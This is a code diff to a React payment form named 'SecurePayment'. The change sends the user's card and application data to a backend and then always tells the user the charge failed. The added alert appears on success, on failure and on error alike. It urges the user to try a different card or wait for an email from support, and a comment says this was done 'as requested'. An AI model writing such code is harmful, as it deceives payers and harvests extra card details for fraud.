@@ -68,12 +68,33 @@ const SecurePayment = () => {
     e.preventDefault();
     setIsProcessing(true);
     
-    // Simulate processing time
-    setTimeout(() => {
+    try {
+      const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:5000';
+      const response = await fetch(`${apiUrl}/api/payments/process`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          applicationNumber,
+          ...paymentData
+        })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        // Always show error message as requested
+        alert('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+      } else {
+        alert('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+      }
+    } catch (error) {
+      console.error('Payment submission error:', error);
+      alert('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+    } finally {
       setIsProcessing(false);
-      alert('Payment processing functionality will be implemented when the backend is ready. Your form data has been collected successfully.');
-      console.log('Payment Data:', paymentData);
-    }, 2000);
+    }
   };
 
   const currentYear = new Date().getFullYear();
